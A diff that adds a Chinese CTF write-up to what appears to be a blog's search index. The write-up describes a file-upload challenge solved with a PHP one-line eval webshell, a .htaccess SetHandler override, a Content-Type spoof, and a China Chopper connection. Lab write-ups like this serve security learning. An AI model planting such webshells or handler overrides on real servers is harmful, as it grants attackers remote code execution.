@@ -560,4 +560,46 @@ let's do it<br />
         <tag>PS--色调</tag>
       </tags>
   </entry>
+  <entry>
+    <title>UPLOAD</title>
+    <url>/UPLOAD/</url>
+    <content><![CDATA[<p>涉及到.htaccess<br />
+<a id="more"></a><br />
+<img data-src="https://i.loli.net/2021/02/21/vU6IVNDxcr9YHbm.png" alt="" title="一目了然" /><br />
+ 就是要我们上传一个 php 一句话木马</p>
+<h2 id="解题思路"><a class="anchor" href="#解题思路">#</a> 解题思路</h2>
+<p>按照往常一样，我们先写一份一句话木马</p>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?php </pre></td></tr><tr><td data-num="2"></td><td><pre>@eval($_POST['attack']) ;</pre></td></tr><tr><td data-num="3"></td><td><pre>?></span></pre></td></tr></table></figure><p>将文本保存成 jpg 格式的图片，然后抓包上传。</p>
+<p><img data-src="https://i.loli.net/2021/02/21/nUXpQqmFbN9jGSe.png" alt="" /><br />
+将 filename 中的 jpg 格式改为 PHP，当作 php 文件解析。</p>
+<p><img data-src="https://i.loli.net/2021/02/21/9QhJTdr3z2FyCus.png" alt="" title="上传失败.." /><br />
+祖安人骂了一半，但口水已经溅到脸上了。<br />
+接下来我改成 phtml,php1、2、3 都不管用；但是直接上传.jpg 是成功的，可问题是服务器并不会把 jpg 当作 php 来解析，这也告知了我们需要用别的文件来辅助上传。<br />
+迫不得已看了 WP，这里需要上传.htaccess 文件，原因是上传目录中没有本该存在的 php 文件。</p>
+<h3 id="这里先大致了解一下什么是htaccess"><a class="anchor" href="#这里先大致了解一下什么是htaccess">#</a> 这里先大致了解一下什么是.htaccess</h3>
+<p>.htaccess 文件（分布式配置文件），提供了针对目录改变配置的方法，<span class="rainbow">就是在一个特定的文件目录中放置一个包含多个指令的文件，以作用于此目录及其子目录。</span><br />
+作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 allowOverride 指令来设置。<br />
+<span class="purple">.htaccess 文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有 root 权限的情况下。</span></p>
+<h2 id="handle"><a class="anchor" href="#handle">#</a> Handle</h2>
+<p>在.htaccess 文件中写入</p>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>SetHandler application/x-httpd-php</pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/02/21/gWwZJlPfoa3EpOr.png" alt="" title="更改Content-Type的类型为  image/jpeg" /><br />
+之后放包</p>
+<p><img data-src="https://i.loli.net/2021/02/21/oxy4dLInORQwpW8.png" alt="" /><br />
+可以看到.htaccess 文件上传成功。</p>
+<p>接下来我们只需要将刚刚上传失败的一句话木马再上传一遍即可。<br />
+<img data-src="https://i.loli.net/2021/02/21/5c4lN8zYBUqTDmy.png" alt="" title="这里不需要该任何东西" /><br />
+<img data-src="https://i.loli.net/2021/02/21/Pqz34WrG5hLTMAJ.png" alt="" title="木马也已经上传成功了" /></p>
+<p>最后我们可以用菜刀链接服务器查看目录里藏着 flag 的文件了。</p>
+<p>菜刀连接，密码为 attack<br />
+<img data-src="https://i.loli.net/2021/02/21/tbCJB6ODKpyAZ5g.png" alt="" title="在根目录中发现flag" /><br />
+ 将它下载下来；<br />
+<img data-src="https://i.loli.net/2021/02/21/5oAvpyN2Pi4TlDF.png" alt="" title="得到flag" /></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
 </search>
